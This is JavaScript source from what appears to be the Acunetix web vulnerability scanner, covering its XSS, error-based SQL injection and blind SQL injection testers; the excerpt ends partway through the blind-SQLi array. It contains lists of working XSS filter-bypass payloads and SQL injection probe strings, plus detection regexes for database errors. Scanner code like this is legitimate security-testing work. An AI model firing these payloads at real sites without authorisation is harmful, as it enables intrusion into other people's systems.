            for(var i = 0 ; i < xssElements.length; i++)
                if (xssElements[i].name == testId)
                    return(true);
        }
        return(false);
    }
	
	this.loadStringInToTheHTMLParser = function(strValue, arrayFilters)
	{
		//this function will be injected in every tested page, if it is executed an XSSTestElement will be created with the name = value
		function XSSsgn(value)
		{
			var XSSTestElement = document.createElement("XSSTestElement");
			XSSTestElement.name = value;
			document.documentElement.appendChild(XSSTestElement);
		}
		
		if(strValue)
		{
			var objBrowserContainer = document.getElementById("acunetix_appcontent_browserContainer");
			if(objBrowserContainer)
			{
				if(arrayFilters.indexOf("filterScript") >= 0 )
				{
					strValue = strValue.replace(/script/i,"scriptx");
				}
				
				if(arrayFilters.indexOf("insertXssTester") >= 0 )
				{
					strValue =  "<script>" + XSSsgn + "</script>" + strValue;
				}
				
				if(arrayFilters.indexOf("silentAlert") >= 0 )
				{
					strValue = "<script>alert = function(a){return false;}</script>" + strValue;
				}
				
				if(arrayFilters.indexOf("filterRedirect") >= 0 )
				{	
					strValue = strValue.replace(/meta/i,"metax");
				}
				
				objBrowserContainer.contentDocument.open();
				objBrowserContainer.contentDocument.write(strValue);
				objBrowserContainer.contentDocument.close();
				return(true);
			}
		}
		return(false);
	}
	
	
	this.doRequestJson = function(objInput)
	{
		/*
		parameter mannipulaion request object deffinition:
		{
			objCallerClass 		: required, the caller class
			strTestString		: required
			
			arrayAcceptedContentTypes	:	optional default ("text/html","text/xml","application/xhtml+xml")
			intRedirectionLimit			: 	optional default 20
			boolDeleteOriginalCookie	:	optional default false
			boolDeleteOriginalHeaders	: 	optional default false
			intEscapeMethod				: 	optional default 0 (no escaping for the tested strTestString)
		} 
		*/
		if (objInput.boolEnableRetry == null)
			objInput.boolEnableRetry = true;
		
		if (objInput.intRedirectionLimit == null )
			objInput.intRedirectionLimit == 20;
			
		if (objInput.boolDeleteOriginalCookie == null)
			objInput.boolDeleteOriginalCookie = false;
			
		if (objInput.boolDeleteOriginalHeaders == null)
			objInput.boolDeleteOriginalHeaders = false;
		
		if (objInput.intEscapeMethod == null)
			objInput.intEscapeMethod = 0;
		
		//normall request from parameter manipulation type test	
		if ((objInput.objCallerClass != null))
		{
			var objRequestClass	= objInput.objCallerClass.objCallerClass.objRequest;
			var cindex = objInput.objCallerClass.objCallerClass.intCombinationIndex;
			
			objInput.objCallerClass.objTaskResult.strInjectedValue = objInput.strTestString;
			
			var objRequest						= new ClassTestRequest();
			objRequest.boolEnableRetry			= objInput.boolEnableRetry;;
			objRequest.boolDeleteOriginalCookie	= objInput.boolDeleteOriginalCookie;
			objRequest.boolDeleteOriginalHeaders= objInput.boolDeleteOriginalHeaders;
			
			objRequest.strRequestURL			= objRequestClass.objAction.getURL(false);
			objRequest.strRequestMethod			= objRequestClass.strRequestMethod;
			objRequest.strUsername				= objRequestClass.objAction.strUsername;
			objRequest.strPassword				= objRequestClass.objAction.strPassword;
			objRequest.intRedirectionLimit		= objInput.intRedirectionLimit;
			objRequest.arrayAcceptedContentTypes= objInput.arrayAcceptedContentTypes;
				
			for(var i = 0 ;  i < objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters.length; i++)
			{
				var strName = objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].strName;
				
				var strValue = "";
				
				if(objRequestClass.arrayOfGeneratedTestCombinations[cindex].intTestedParameterIndex == objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param)
				{
					strValue = this.myescape (objInput.strTestString, objInput.intEscapeMethod);
				}
				else
				{
					strValue = this.myescape (
									objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].arraySelectableValues[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].index],
									objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].intEscapeMethod);
				}
	
				if(objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].strRequestType == 'GET')
					objRequest.objGetParams.addParameter(strName,strValue);
				if(objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].strRequestType == 'POST')
					objRequest.objPostParams.addParameter(strName,strValue);
				if(objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].strRequestType == 'COOKIE')
					objRequest.objCookieParams.addParameter(strName,strValue);
				if(objRequestClass.arrayParameters[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param].strRequestType == 'HEADERS')
					objRequest.objHeaders.addParameter(strName,strValue);
			}
			objRequest.doAsincronRequest(objInput.objCallerClass);
		}
		else
		{
			//serious error
			alert("Acunetix Scanner Internal error 01");
			//todo: this is a serious error so here we can and need to abort the scanning process!!
		}
		
	}
		
	this.register = function()
	{
		logToFile("classGenericTester/register");
		
		acunetixwebscanner.arrayOfTestProcedures.push(this);
		
		//increase registered test number
		acunetixwebscanner.objMozPrefs.setIntPref("intRegisteredTestNumber", acunetixwebscanner.arrayOfTestProcedures.length);
		
		acunetixwebscanner.objMozPrefs.setBoolPref("boolTestDemo" + acunetixwebscanner.arrayOfTestProcedures.length, !this.enabled);
		
		//register the test but with care if already registered to not reset his settings
		var strLastTestName = acunetixwebscanner.objMozPrefs.getCharPref("strTestName" + acunetixwebscanner.arrayOfTestProcedures.length);
		if(strLastTestName == this.strTestName)
			return;
		
		acunetixwebscanner.objMozPrefs.setBoolPref("boolTestEnabled" + acunetixwebscanner.arrayOfTestProcedures.length, this.enabled);
		acunetixwebscanner.objMozPrefs.setCharPref("strTestName" + acunetixwebscanner.arrayOfTestProcedures.length, this.strTestName);
	}
	
	//test exit function, this function will call the parent callbcak
	this.fncExitTest = function(boolVulnerable, strTestName)
	{			
		this.objCallerClass.objTaskResult.boolIsVulenrable = boolVulnerable;
		if(boolVulnerable)
		{
			this.objCallerClass.objTaskResult.strInjectedValue	= this.objTaskResult.strInjectedValue;
			this.objCallerClass.objTaskResult.strTestName		= strTestName;
		}
		acunetixwebscanner.generalTimer.initWithCallback(this.objCallerClass.fncTaskCallBack, acunetixwebscanner.objMozPrefs.getIntPref("intStatusMachineRetriggerTime") , Components.interfaces.nsITimer.TYPE_ONE_SHOT);	
	},

	this.doTest = function(objCallerClass)
	{
		//this test will be overwritted
		// mandatory this function will have to call the return timer once and only once
		acunetixwebscanner.generalTimer.initWithCallback(this.parent.objCallerClass.fncTaskCallBack, acunetixwebscanner.objMozPrefs.getIntPref("intStatusMachineRetriggerTime") , Components.interfaces.nsITimer.TYPE_ONE_SHOT);
	}
	
	this.getOriginalValueOfTestedItem = function(objCallerClass)
	{
		var objRequestClass	= objCallerClass.objCallerClass.objRequest;
		var cindex = objCallerClass.objCallerClass.intCombinationIndex;
		var pindex = objRequestClass.arrayOfGeneratedTestCombinations[cindex].intTestedParameterIndex;
		
		var strRetval = "";
		
		for(var i = 0; i < objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters.length; i ++)
			if(objRequestClass.arrayOfGeneratedTestCombinations[cindex].intTestedParameterIndex == objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].param)
				strRetval = objRequestClass.arrayParameters[pindex].arraySelectableValues[objRequestClass.arrayOfGeneratedTestCombinations[cindex].arrayParameters[i].index];
		
		return(strRetval);
	}
}




VM894:16 /*
Author:		Attila Gerendi
Purpose:	XSS test 
*/

var xssTester					= new classGenericTester();
xssTester.strXULMenuId			= "acunetix_testtype_xss"
xssTester.strXULMenuText		= "XSS"
xssTester.strXULMenuHint		= "Scan for Cross-Site Scripting Vulnerabilities"
xssTester.strXULMenuAccesskey	= "S"
xssTester.strType				= "Cross-Site Scripting (XSS)";
xssTester.strTestName			= "Cross-Site Scripting (XSS)";
xssTester.severity				= "High";
xssTester.strDescription		= "http://www.acunetix.com/websitesecurity/cross-site-scripting.htm";
xssTester.wvsCorelationID		= "XSS.xml"
xssTester.enabled				= true;


xssTester.doTest = function(objCallerClass)
{	
	this.strTestArgument	= Math.floor(Math.random()*1345670)+"";
	this.arrayExecutedXSSTest 	= new Array();
	
	
	//todo: include htmlparser based tests
	
	//xss_lev2_css_0123_anchor
	this.arrayExecutedXSSTest.push(";background:url(javascript:XSSsgn(" + this.strTestArgument + "))");
	//xss_lev3_css_0123_anchor
	this.arrayExecutedXSSTest.push(";foo:expr/**/ession(XSSsgn((" + this.strTestArgument + "));");
	//xss_lev2_attrdoublequote_012_anchor
	//xss_lev2_attrsinglequote_012_anchor
	//xss_lev2_imgSrc_012_anchor
	this.arrayExecutedXSSTest.push("javascript:XSSsgn(" + this.strTestArgument + ")");
		
	this.arrayExecutedXSSTest.push("<script>XSSsgn(" + this.strTestArgument + ")</script>");												//	basic
	this.arrayExecutedXSSTest.push("<ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>");									//	simple
	this.arrayExecutedXSSTest.push("\"><ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>");									//
	this.arrayExecutedXSSTest.push("\'><ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>");									//
	this.arrayExecutedXSSTest.push("</textarea><ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>");							//Textarea closed
	this.arrayExecutedXSSTest.push("</title><ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>");								//Title closed
	this.arrayExecutedXSSTest.push("--><ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>");									//Comment closed
	this.arrayExecutedXSSTest.push("email@some<ScRiPt%20%0a%0d>XSSsgn(" + this.strTestArgument + ")%3B</ScRiPt>domain.com");				//pass email validation
	this.arrayExecutedXSSTest.push("[img]JaVaScRiPt:XSSsgn(" + this.strTestArgument + ")%3B[/img]");										//BBCode
	this.arrayExecutedXSSTest.push("%3Cimg%20src%3D%22JaVaS%26%2399%3BRiPt:XSSsgn(" + this.strTestArgument + ")%29%3B%22%3E");				//Img src
	this.arrayExecutedXSSTest.push("<%00script>XSSsgn(" + this.strTestArgument + ")%3B</script>");											//ASP.NET v1.1
	this.arrayExecutedXSSTest.push("<scrip<script>t>XSSsgn(" + this.strTestArgument + ")%3B</scrip</script>t>");							//Replace script tags
	this.arrayExecutedXSSTest.push("<DIV+STYLE=\"width:expression(XSSsgn(" + this.strTestArgument + "))%3B\">");							//Div style with expression
	this.arrayExecutedXSSTest.push("<FRAMESET><FRAME+SRC=\"JaVaS%26%2399%3BRiPt:XSSsgn(" + this.strTestArgument + ")%3B\"></FRAMESET>");	//Frame
	this.arrayExecutedXSSTest.push("%3Cimg%20dynsrc%3D%22JaVaScRiPt:XSSsgn%28$" + this.strTestArgument + "%29%3B%22%3E");					//Img dynsrc
	this.arrayExecutedXSSTest.push('<META+HTTP-EQUIV="refresh"+CONTENT="0%3Burl=JaVaS%26%2399%3BRiPt:XSSsgn(' + this.strTestArgument + ')%3B">');	//Meta
	this.arrayExecutedXSSTest.push('<iframe+src="data:text/html%3Bbase64,' + acunetixwebscanner.generalEncoder.encode64('<script>XSSsgn(' + this.strTestArgument + ')</script>') + '">'); //Iframe with data urls
	this.arrayExecutedXSSTest.push('<body+onload=XSSsgn(' + this.strTestArgument + ')>'); //Body onload
	this.arrayExecutedXSSTest.push('<img+src=http://testphp.vulnweb.com/dot.gif+onload=XSSsgn(' + this.strTestArgument + ')>'); //Img onload
	this.arrayExecutedXSSTest.push('\'+style=\'background:url(JaVaScRiPt:(' + this.strTestArgument + '))\'+invalidparam=\''); //Background URL JS (ie6 only)
	this.arrayExecutedXSSTest.push('%253CScRiPt%253EXSSsgn(' + this.strTestArgument + ')%3B%253C/ScRiPt%253E');	//Double encoded
	this.arrayExecutedXSSTest.push('"+onmouseover=XSSsgn(' + this.strTestArgument + ')+'); //OnMouseOver
	this.arrayExecutedXSSTest.push('</div><ScRiPt%20%0a%0d>XSSsgn(' + this.strTestArgument + ')%3B</ScRiPt>'); //Div closed
	this.arrayExecutedXSSTest.push('%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text%2Fhtml%3Bcharset%3DUTF-7%22%3E%3C%2FHEAD%3E%2BADw-ScRiPt%2BAD4-XSSsgn%28' + this.strTestArgument + '%29%2BADsAPA-%2FScRiPt%2BAD4-'); //UTF-7 simple
	this.arrayExecutedXSSTest.push('%00\'"><ScRiPt%20%0a%0d>XSSsgn(' + this.strTestArgument + ')%3B</ScRiPt>'); //Null character #1
	this.arrayExecutedXSSTest.push('%00"\'><ScRiPt%20%0a%0d>XSSsgn(' + this.strTestArgument + ')%3B</ScRiPt>'); //Null character #2
	this.arrayExecutedXSSTest.push(acunetixwebscanner.generalEncoder.encode64('<ScRiPt>XSSsgn(' + this.strTestArgument + ');</ScRiPt>'));		//Base64 encoded #1
	this.arrayExecutedXSSTest.push(acunetixwebscanner.generalEncoder.encode64('>\'><ScRiPt>XSSsgn(' + this.strTestArgument + ');</ScRiPt>'));	//Base64 encoded #2
	this.arrayExecutedXSSTest.push(acunetixwebscanner.generalEncoder.encode64('>"><ScRiPt>XSSsgn(' + this.strTestArgument + ');</ScRiPt>'));	//Base64 encoded #3
	this.arrayExecutedXSSTest.push(acunetixwebscanner.generalEncoder.encode64('" onmouseover="XSSsgn(' + this.strTestArgument + ')'));			//Base64 encoded #4
	this.arrayExecutedXSSTest.push('%uff1e%uff02%uff1exxx%uff1cscript%uff1eXSSsgn(' + this.strTestArgument + ')%3B%uff1c/script%uff1e');	//ASP.NET test1
	this.arrayExecutedXSSTest.push('%uff1e%uff07%uff1exxx%uff1cscript%uff1eXSSsgn(' + this.strTestArgument + ')%3B%uff1c/script%uff1e');	//ASP.NET test2
	this.arrayExecutedXSSTest.push('%3C/xss/*-*/style=xss:e/**/xpression(XSSsgn(' + this.strTestArgument + '))%3E');						//ASP.NET test3
	
	this.arrayExecutedXSSTest 	= new Array();
	this.arrayExecutedXSSTest.push("<script>XSSsgn(" + this.strTestArgument + ")</script>");	
	
	//todo: expand xss reflection test
	this.arrayReflectionXSSTest 	= new Array();
	this.arrayReflectionXSSTest.push(['<>\'"','<>\'"']);
	this.arrayReflectionXSSTest.push([acunetixwebscanner.generalEncoder.encode64('<>\'"'),'<>\'"'])
	this.arrayReflectionXSSTest.push(['"','"']);
	this.arrayReflectionXSSTest.push([acunetixwebscanner.generalEncoder.encode64('"'),'"']);
	this.arrayReflectionXSSTest.push(['\'','\'']);
	this.arrayReflectionXSSTest.push([acunetixwebscanner.generalEncoder.encode64('\''),'\'']);
	
	
	/* with problems:
		Flash,
		Simple wih remote src,
		Non-alpha/non-digit,
		Script remote src variant,
		Inside script tag
	*/
	
	this.arrayAcceptedContentTypes = new Array("text/html","text/xml","application/xhtml+xml");

	
	this.doTestXss =
	{
		intTestType			: 0,
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
		
		notify 	: function(timer)
		{
			this.test();
		},
		
		test	: function()
		{
			if (this.intTestType == 0)
			{
				this.doBasicReflectionTest();
				return;
			}
			if (this.intTestType == 1)
			{
				this.doExecutedXSSTest();
				return;
			}
			if (this.intTestType == 2)
			{
				this.doReflectionXSSTest();
				return;
			}
		},
		
		doBasicReflectionTest 	: function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("/xssTester/doTestXss: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.strTestString,
						arrayAcceptedContentTypes 	: new Array("text/html","text/xml","application/xhtml+xml"),
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				
				return;
				
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
								
				if ((this.parent.objTaskResult.intErrorCode == 0) && (this.parent.objTaskResult.strResponseText.search(this.strTestString) > 0))
				{
					this.boolRequestPhase = true;
					this.intTestType ++;
					this.test();
					return;
				}
				else
				{
					this.parent.fncExitTest(false);
					return;
				}	
			}
		},
		
		doExecutedXSSTest 	: function()
		{
			logToFile("/xssTester => Enter");
			
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("/xssTester/doTestXss: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
				logToFile("/xssTester/doTestXss: intStep = " + this.intStep);
						
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
							
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayExecutedXSSTest[this.intStep],
						arrayAcceptedContentTypes 	: new Array("text/html","text/xml","application/xhtml+xml"),
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
			}
			else
			{
				
				var objBrowserContainer = document.getElementById("acunetix_appcontent_browserContainer");
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					this.parent.loadStringInToTheHTMLParser(this.parent.objTaskResult.strResponseText,["insertXssTester", "filterRedirect", "silentAlert"]);	
										
					if (this.parent.testXssGenerationByID(this.parent.strTestArgument))
					{
						LogHTTPToFile(this.parent.objTaskResult, true);
						this.parent.fncExitTest(true,"XSS (Test for executed XSS)");
						return;
					}
				}
				
				LogHTTPToFile(this.parent.objTaskResult, false);
				this.intStep ++;
				if(this.intStep >= this.parent.arrayExecutedXSSTest.length)
				{
					this.boolRequestPhase = true;
					this.intTestType ++;
					this.test();
					return;
				}
				this.boolRequestPhase = true;
				this.test();
			}
		},
		
		doReflectionXSSTest 	: function() //this test will try to se if unescaped characters <"> are returning
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("/xssTester/doTestXss: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
				logToFile("/xssTester/doTestXss: intStep = " + this.intStep);
				if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.strTestString+"<\">",
						arrayAcceptedContentTypes 	: new Array("text/html","text/xml","application/xhtml+xml"),
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
				
			}
			else
			{
			
				if ((this.parent.objTaskResult.intErrorCode == 0) && (this.parent.objTaskResult.strResponseText.search(this.strTestString+"<\">") > 0))
				{
					LogHTTPToFile(this.parent.objTaskResult, true);
					this.parent.fncExitTest(true,"XSS (Reflection test)");
					return;
				}
				else
				{
					LogHTTPToFile(this.parent.objTaskResult, false);
					this.parent.fncExitTest(false);
					return;
				}	
			}
		}
	}
	
	this.objTaskResult 		= objCallerClass.objTaskResult;
	this.objCallerClass		= objCallerClass;
	
	this.doTestXss.parent	= this;
	this.fncTaskCallBack	= this.doTestXss;
	
	this.doTestXss.test();
}

//register the tester object
xssTester.register();


VM894:17 /*
Author:		Attila Gerendi
Purpose:	The SQL injection test
*/

var sqlInjectionTester					= new classGenericTester();
sqlInjectionTester.strXULMenuId			= "acunetix_testtype_SQLInjection";
sqlInjectionTester.strXULMenuText		= "SQL Injection (error msg. test)";
sqlInjectionTester.strXULMenuHint		= "Scan for SQL Injection Vulnerabilities";
sqlInjectionTester.strXULMenuAccesskey	= "Q";
sqlInjectionTester.strType				= "SQL Injection";
sqlInjectionTester.strTestName			= "SQL Injection (error msg. test)";
sqlInjectionTester.severity				= "High";
sqlInjectionTester.strDescription		= "http://www.acunetix.com/websitesecurity/sql-injection.htm";
sqlInjectionTester.wvsCorelationID		= "SQL_Injection.xml"
sqlInjectionTester.enabled				= false;
/*IMPLEMENTATION*/
sqlInjectionTester.enabled				= true;

function searchForKnownSQLErrors(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	arraySQLInjectionTestConditions = new Array
	(
		new Array({regex : /(Microsoft OLE DB Provider for ODBC Drivers)/, condition : true}),
		new Array({regex : /(Microsoft OLE DB Provider for SQL Server)/, condition : true}),
		new Array(
			{regex : /(ODBC Microsoft Access Driver)/, condition : true},
			{regex : /(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')/, condition : false}
			),
		new Array({regex : /(ODBC SQL Server Driver)/ , condition: true}),
		new Array({regex : /(supplied argument is not a valid MySQL result)/ , condition: true}),
		new Array({regex : /(Invalid parameter type)/ , condition: true}),
		new Array({regex : /(You have an error in your SQL syntax)/ , condition: true}),
		new Array({regex : /(Incorrect column name)/ , condition: true}),
		new Array({regex : /(Can't find record in)/ , condition: true}),
		new Array({regex : /(Unknown table)/ , condition : true}),
		new Array({regex : /(Incorrect column specifier for column)/ , condition : true}),
		new Array({regex : /(Column count doesn't match value count at row)/ , condition : true}),
		new Array({regex : /(Unclosed quotation mark before the character string)/ , condition : true}),
		
		new Array({regex : /(Incorrect\ssyntax\snear\s'[^']*')/ig, condition : true}),
		new Array({regex : /(pg_query\(\)[:]*\squery\sfailed:\serror:\s)/i, condition : true}),
		new Array({regex : /('[^']*'\sis\snull\sor\snot\san\sobject)/i, condition : true}),
		new Array({regex : /(ERROR: parser: parse error at or near)/i, condition : true}),
		
		new Array({regex : /(ORA-\d{4,5}:\s)/, condition : true}),
		
		new Array({regex : /(java.lang.NumberFormatException: For input string:)/, condition : true}),
		new Array({regex : /(\): encountered SQLException \[)/, condition : true}),
		new Array({regex : /Unexpected end of command in statement \[/, condition : true}),
		
		new Array({regex : /(Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<br><b>.*,\sline\s\d+<\/b><br>)/, condition : true}),
		new Array({regex : /(<h2>\s<i>Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*\.<\/i>\s<\/h2><\/span>)/, condition : true}),
		new Array({regex : /(<font\sface=\"Arial\"\ssize=2>Syntax\serror\s(.*)?in\squery\sexpression\s'(.*)\.<\/font>)/, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:\s\spg_exec\(\)\s\[\<a\shref='function.pg\-exec\'\>function\.pg-exec\<\/a>\]\:\sQuery failed:\sERROR:\s\ssyntax error at or near \&quot\;\\\&quot; at character \d+ in\s<b>.*<\/b>)/, condition : true}),
		new Array({regex : /(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\s\([^)]*?\)\sin\squery\sexpression\s.*)/, condition : true}),
		new Array({regex : /(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\sin\sstring\sin\squery\sexpression\s)/, condition : true}),
		new Array({regex : /(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')/, condition : true}),
		new Array({regex : /(<font style="COLOR: black; FONT: 8pt\/11pt verdana">\s+(\[Macromedia\]\[SQLServer\sJDBC\sDriver\]\[SQLServer\]|Syntax\serror\sin\sstring\sin\squery\sexpression\s))/, condition : true}),
		new Array({regex : /(Unclosed\squotation\smark\safter\sthe\scharacter\sstring\s'[^']*')/, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\): supplied argument is not a valid MySQL result resource in <b>.*?<\/b> on line <b>.*?<\/b>)/, condition : true})
	);
				  
	for( var i = 0; i < arraySQLInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arraySQLInjectionTestConditions[i].length; j++)
		{
			var match = (arraySQLInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arraySQLInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}

sqlInjectionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arraySQLInjectionTestValues = new Array
	(
		"'",			//single quote
		"%2527",		//double encoded
		"%00'",			//Quote preceded by zero character
		"acunetix'\"",	//Single and double combined
		"\\'",			//Escape backslash
		"\\\"",			//Escape backslash with double quote
		"JyI%3D",		//Base64 encoded
		"0.001"			//float -> LIMIT
	)
	
	this.objTaskResult = objCallerClass.objTaskResult;
		
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
			
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> sqlInjectionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return ;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arraySQLInjectionTestValues[this.intStep],
						//arrayAcceptedContentTypes 	: new Array("text/html","text/xml","application/xhtml+xml"),
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForKnownSQLErrors(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, "SQL Injection (error codes test)");
						return;
					}
				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arraySQLInjectionTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}

//register the tester object
sqlInjectionTester.register();

VM894:18 /*
Author:		Attila Gerendi
Purpose:	Blind SQL injection tester
*/

var bsqlInjectionTester					= new classGenericTester();
bsqlInjectionTester.strXULMenuId		= "acunetix_testtype_bSQLInjection";
bsqlInjectionTester.strXULMenuText		= "SQL Injection (blind test)";
bsqlInjectionTester.strXULMenuHint		= "Scan for SQL Injection Vulnerabilities";
bsqlInjectionTester.strXULMenuAccesskey	= "B";
bsqlInjectionTester.strType				= "SQL Injection";
bsqlInjectionTester.strTestName			= "SQL Injection (blind test)";
bsqlInjectionTester.severity			= "High";
bsqlInjectionTester.strDescription		= "http://www.acunetix.com/websitesecurity/sql-injection.htm";
bsqlInjectionTester.wvsCorelationID		= "Blind_SQL_injection_(number).xml";
bsqlInjectionTester.enabled				= false;
/*IMPLEMENTATION*/
bsqlInjectionTester.enabled				= true;

function compareHTMLStructures(strHTML1,strHTML2,arrayExcludeRegex)
{
	logToFile("compareHTMLStructures => " + arrayExcludeRegex);
	for(var i = 0; i < arrayExcludeRegex.length; i++)
	{
		regexp = new RegExp('(' + arrayExcludeRegex[i] + ')',"ig");
		strHTML1 = strHTML1.replace( regexp, "");
		strHTML2 = strHTML2.replace( regexp, "");
	}
	logToFile(strHTML2);
	return(strHTML1 == strHTML2);
}

bsqlInjectionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	this.objTaskResult 		= objCallerClass.objTaskResult;
	
	//injected values				  
	this.arrayBlindInjectionTest = new Array
	(
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}+and+1%3D1", cond : true, relative : 0},
					  {sql : "${origvalue}+and+1%3D0", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}+or+1%3D1", cond : false, relative : 0},
					  {sql : "${origvalue}+or+1%3D0", cond : true, relative : 0}
					  ),
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}'+and+'1'%3D'1", cond : true, relative : 0},
					  {sql : "${origvalue}'+and+'1'%3D'0", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}\"+and+\"1\"%3D\"1", cond : true, relative : 0},
					  {sql : "${origvalue}\"+and+\"1\"%3D\"0", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "2989+and+1%3D0+--+"},
					  {sql : "2989+and+1%3D1+--+", cond : true, relative : 0},
					  {sql : "2989+or+1%3D0+--+", cond : true, relative : 0},
					  {sql : "2989+or+1%3D1+--+", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "'+and+1%3D0+--+", cond : true},
					  {sql : "'+and+1%3D1+--+", cond : true, relative : 0},
					  {sql : "'+or+1%3D0+--+", cond : true, relative : 0},
					  {sql : "'+or+1%3D1+--+", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "\"+and+1%3D0+--+"},
					  {sql : "\"+and+1%3D1+--+", cond : true, relative : 0},
					  {sql : "\"+or+1%3D0+--+", cond : true, relative : 0},
					  {sql : "\"+or+1%3D1+--+", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}%2B31337%2D31337", cond : true, relative : 0},
					  {sql : "${origvalue}%2B31337", cond : false, relative : 0},
					  {sql : "${origvalue}%2B31337%2B31337", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}'%2Blower('')%2Bupper('')%2B'", cond : true, relative : 0},
